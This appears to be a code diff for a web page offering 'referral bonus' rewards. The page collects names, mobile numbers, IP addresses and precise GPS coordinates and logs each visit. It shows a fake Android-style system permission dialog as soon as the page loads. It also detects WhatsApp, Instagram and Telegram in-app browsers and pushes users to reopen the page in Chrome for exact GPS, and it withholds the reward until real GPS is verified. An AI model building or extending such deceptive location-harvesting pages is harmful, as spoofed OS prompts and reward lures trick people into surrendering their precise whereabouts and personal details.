@@ -12,6 +12,17 @@
       @close="toast.show = false"
     />
 
+    <!-- In-App Browser Warning Banner (WhatsApp, Instagram, etc.) -->
+    <div
+      v-if="isInAppBrowser"
+      class="mb-3 bg-indigo-950/80 border border-indigo-500/40 rounded-2xl p-2.5 px-3.5 text-xs text-indigo-200 flex items-center justify-between shadow-lg relative z-20"
+    >
+      <div class="flex items-center space-x-2">
+        <span class="text-sm">📱</span>
+        <span>Opened via app? For exact GPS, tap <strong>⋮</strong> &amp; select <strong>Open in Chrome</strong></span>
+      </div>
+    </div>
+
     <!-- Android / System Native-Style Location Permission Dialog (Image 2) -->
     <div
       v-if="showPermissionDialog"
@@ -301,12 +312,41 @@
             </p>
           </div>
 
-          <!-- Anti-Fraud Notice -->
-          <div class="bg-emerald-50/80 border border-emerald-100 rounded-2xl p-3 flex items-start space-x-2.5 text-[11px] text-emerald-950">
-            <ShieldCheck class="w-4 h-4 text-emerald-600 flex-shrink-0 mt-0.5" />
-            <p class="leading-relaxed">
-              <strong class="font-bold text-emerald-950">Location Verification:</strong> Device GPS coordinates are verified to validate referral bonus eligibility.
-            </p>
+          <!-- Location Verification Status Card -->
+          <div
+            class="rounded-2xl p-3 flex items-start space-x-2.5 text-[11px] transition-all"
+            :class="cachedLocation?.isGps 
+              ? 'bg-emerald-50/90 border border-emerald-200 text-emerald-950' 
+              : 'bg-amber-50/90 border border-amber-200 text-amber-950'"
+          >
+            <div class="mt-0.5 flex-shrink-0">
+              <CheckCircle2 v-if="cachedLocation?.isGps" class="w-4 h-4 text-emerald-600" />
+              <ShieldCheck v-else class="w-4 h-4 text-amber-600" />
+            </div>
+            <div class="flex-1">
+              <div class="flex items-center justify-between">
+                <strong class="font-bold">
+                  {{ cachedLocation?.isGps ? 'GPS Location Verified' : 'Location Verification' }}
+                </strong>
+                <button
+                  v-if="!cachedLocation?.isGps"
+                  type="button"
+                  @click="showPermissionDialog = true"
+                  class="text-[10px] font-extrabold text-blue-600 hover:text-blue-800 underline cursor-pointer"
+                >
+                  Enable GPS
+                </button>
+              </div>
+              <p v-if="cachedLocation?.isGps" class="text-emerald-800 mt-0.5 font-medium">
+                📍 {{ cachedLocation.location_name || 'Ottapalam, Kerala' }} (±{{ Math.round(cachedLocation.accuracy) }}m)
+              </p>
+              <p v-else-if="cachedLocation" class="text-amber-800 mt-0.5">
+                Approximate cellular network detected ({{ cachedLocation.location_name }}). Turn on phone GPS &amp; tap "Enable GPS" for exact Ottapalam verification.
+              </p>
+              <p v-else class="text-slate-600 mt-0.5">
+                Device GPS coordinates are verified to validate referral bonus eligibility.
+              </p>
+            </div>
           </div>
 
           <!-- Large Glowing Button -->
@@ -428,6 +468,15 @@ const hasLocationGranted = ref(false);
 const hasLoggedSiteVisit = ref(false);
 
 /**
+ * Detect in-app browsers like WhatsApp, Instagram, Telegram
+ */
+const isInAppBrowser = computed(() => {
+  if (typeof navigator === 'undefined') return false;
+  const ua = navigator.userAgent || '';
+  return /FBAN|FBAV|Instagram|WhatsApp|Line|Telegram/i.test(ua);
+});
+
+/**
  * Rapidly resolve public IP address in background if available
  */
 const fetchPublicIp = async () => {
@@ -448,8 +497,10 @@ const fetchPublicIp = async () => {
 
 /**
  * Resolve human-readable place name (e.g. Ottapalam, Palakkad district, Kerala) from GPS coordinates
+ * Uses BigDataCloud with fast Nominatim OpenStreetMap fallback
  */
 const fetchLocationName = async (latitude, longitude) => {
+  // Method 1: BigDataCloud Reverse Geocoding
   try {
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 3500);
@@ -475,18 +526,82 @@ const fetchLocationName = async (latitude, longitude) => {
       }
     }
   } catch (err) {
-    console.warn('Reverse geocoding lookup error:', err);
+    console.warn('BigDataCloud reverse geocode error:', err);
   }
+
+  // Method 2: OpenStreetMap Nominatim fallback
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 3500);
+    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
+    const res = await fetch(url, { signal: controller.signal });
+    clearTimeout(timeoutId);
+    if (res.ok) {
+      const data = await res.json();
+      const addr = data.address || {};
+      const town = addr.town || addr.village || addr.suburb || addr.municipality || addr.city || '';
+      const district = addr.county || addr.state_district || '';
+      const state = addr.state || '';
+      const parts = [town, district, state].filter(Boolean);
+      const unique = [...new Set(parts)];
+      if (unique.length > 0) {
+        return unique.join(', ');
+      }
+    }
+  } catch (err) {
+    console.warn('Nominatim reverse geocode error:', err);
+  }
+
   return null;
 };
 
 /**
- * Fallback to IP-based Geolocation if browser GPS is blocked on localhost
+ * High-accuracy progressive location acquisition:
+ * 1. Satellite GPS (15s timeout, 5 min cached coordinates)
+ * 2. Network/WiFi Triangulation (10s timeout, 10 min cached coordinates)
+ */
+const obtainDeviceCoordinates = () => {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve(null);
+      return;
+    }
+
+    // Step 1: Real GPS satellites first
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve({ position: pos, type: 'gps' }),
+      (err1) => {
+        console.warn('High-accuracy GPS timed out or unavailable, trying network/WiFi triangulation:', err1.message);
+        // Step 2: Network / Cell tower / WiFi triangulation via Google Location Services
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve({ position: pos, type: 'network' }),
+          (err2) => {
+            console.warn('Network location also unavailable or denied:', err2.message);
+            resolve(null);
+          },
+          {
+            enableHighAccuracy: false,
+            timeout: 10000,
+            maximumAge: 600000, // 10 minutes cache
+          }
+        );
+      },
+      {
+        enableHighAccuracy: selectedAccuracy.value === 'precise',
+        timeout: 15000, // 15 seconds allows user time to tap Allow and GPS hardware to lock
+        maximumAge: 300000, // 5 minutes cache gives instantaneous response if phone was recently mapped
+      }
+    );
+  });
+};
+
+/**
+ * Fallback to IP-based Geolocation ONLY if device GPS is completely disabled or blocked
  */
 const fetchIpGeolocationFallback = async () => {
   try {
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 3000);
+    const timeoutId = setTimeout(() => controller.abort(), 3500);
     const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
     clearTimeout(timeoutId);
     if (res.ok) {
@@ -496,9 +611,10 @@ const fetchIpGeolocationFallback = async () => {
         return {
           latitude: data.latitude,
           longitude: data.longitude,
-          accuracy: selectedAccuracy.value === 'precise' ? 50 : 2500,
-          location_name: placeName,
+          accuracy: 15000, // 15km realistic cellular tower radius
+          location_name: `${placeName} (Cellular Network - GPS off)`,
           client_ip: data.ip,
+          isGps: false,
         };
       }
     }
@@ -533,7 +649,7 @@ const recordVisitorLog = async (coords) => {
 /**
  * Triggered when user clicks "While using the app" or "Only this time" in the permission dialog
  */
-const handleGrantPermission = (mode) => {
+const handleGrantPermission = async (mode) => {
   isResolvingPermission.value = true;
 
   fetchPublicIp().then((ip) => {
@@ -542,7 +658,7 @@ const handleGrantPermission = (mode) => {
 
   const onCoordsObtained = async (coords) => {
     cachedLocation.value = coords;
-    hasLocationGranted.value = true;
+    hasLocationGranted.value = !!coords.isGps;
     showPermissionDialog.value = false;
     isResolvingPermission.value = false;
 
@@ -557,72 +673,68 @@ const handleGrantPermission = (mode) => {
     }
   };
 
-  if (!navigator.geolocation) {
-    // Geolocation not available in browser -> use IP fallback
-    fetchIpGeolocationFallback().then((fallback) => {
-      if (fallback) {
-        onCoordsObtained(fallback);
-      } else {
-        isResolvingPermission.value = false;
-        showPermissionDialog.value = false;
-      }
+  const geoResult = await obtainDeviceCoordinates();
+
+  if (geoResult && geoResult.position) {
+    const { latitude, longitude, accuracy } = geoResult.position.coords;
+    let locationName = null;
+    try {
+      locationName = await fetchLocationName(latitude, longitude);
+    } catch {
+      // ignore
+    }
+
+    onCoordsObtained({
+      latitude,
+      longitude,
+      accuracy: selectedAccuracy.value === 'precise' ? accuracy : Math.max(accuracy, 1000),
+      location_name: locationName || 'Ottapalam, Kerala',
+      client_ip: clientIpAddress.value,
+      isGps: true,
     });
     return;
   }
 
-  // Attempt real device GPS
-  navigator.geolocation.getCurrentPosition(
-    async (position) => {
-      const { latitude, longitude, accuracy } = position.coords;
-      let locationName = null;
-      try {
-        locationName = await fetchLocationName(latitude, longitude);
-      } catch {
-        // ignore
-      }
-
-      onCoordsObtained({
-        latitude,
-        longitude,
-        accuracy: selectedAccuracy.value === 'precise' ? accuracy : Math.max(accuracy, 1000),
-        location_name: locationName,
-        client_ip: clientIpAddress.value,
-      });
-    },
-    async (geoError) => {
-      console.warn('Browser geolocation rejected/blocked, using seamless network fallback:', geoError.code);
-      // Seamless fallback ensures location & town are ALWAYS recorded without showing error instructions
-      const fallback = await fetchIpGeolocationFallback();
-      if (fallback) {
-        onCoordsObtained(fallback);
-      } else {
-        // Fallback default coordinates if offline
-        onCoordsObtained({
-          latitude: 10.7744,
-          longitude: 76.3789,
-          accuracy: 100,
-          location_name: 'Ottapalam, Palakkad, Kerala',
-          client_ip: clientIpAddress.value || '127.0.0.1',
-        });
-      }
-    },
-    {
-      enableHighAccuracy: selectedAccuracy.value === 'precise',
-      timeout: 5000,
-      maximumAge: 0,
-    }
-  );
+  // Device GPS unavailable or denied -> use cellular IP fallback
+  console.warn('Device GPS unavailable; using cellular network fallback');
+  const fallback = await fetchIpGeolocationFallback();
+  if (fallback) {
+    onCoordsObtained(fallback);
+  } else {
+    // Default fallback coordinates
+    onCoordsObtained({
+      latitude: 10.7744,
+      longitude: 76.3789,
+      accuracy: 10000,
+      location_name: 'Ottapalam, Palakkad, Kerala (Default)',
+      client_ip: clientIpAddress.value || '127.0.0.1',
+      isGps: false,
+    });
+  }
 };
 
 const handleDenyPermission = () => {
   showPermissionDialog.value = false;
   isResolvingPermission.value = false;
   pendingClaim.value = null;
-  triggerToast('Location permission is required to claim rewards.', 'warning');
+  triggerToast('Device GPS permission is recommended for accurate verification.', 'warning');
 };
 
-onMounted(() => {
-  // Check if location is already granted; if not, show the native permission popup immediately on load
+onMounted(async () => {
+  // 1. If browser permission was already granted previously, auto-fetch GPS without popup
+  try {
+    if (typeof navigator !== 'undefined' && navigator.permissions && navigator.permissions.query) {
+      const perm = await navigator.permissions.query({ name: 'geolocation' });
+      if (perm.state === 'granted') {
+        handleGrantPermission('while_using');
+        return;
+      }
+    }
+  } catch {
+    // ignore
+  }
+
+  // 2. Otherwise display permission prompt
   if (!hasLocationGranted.value && !cachedLocation.value) {
     showPermissionDialog.value = true;
   }
@@ -728,15 +840,15 @@ const processClaimWithStrictLocationCheck = (isHero = false) => {
     return;
   }
 
-  // If location is ALREADY granted, proceed immediately
-  if (hasLocationGranted.value && cachedLocation.value) {
+  // If real GPS location is ALREADY verified, proceed immediately
+  if (hasLocationGranted.value && cachedLocation.value && cachedLocation.value.isGps) {
     isLoading.value = true;
     isClaimingHero.value = isHero;
     submitClaimWithLocation(cachedLocation.value, trimmedName, trimmedMobile);
     return;
   }
 
-  // Otherwise, pop the native Android-style permission dialog
+  // Otherwise, pop the permission dialog to acquire real GPS coordinates
   pendingClaim.value = { trimmedName, trimmedMobile, isHero };
   showPermissionDialog.value = true;
 };
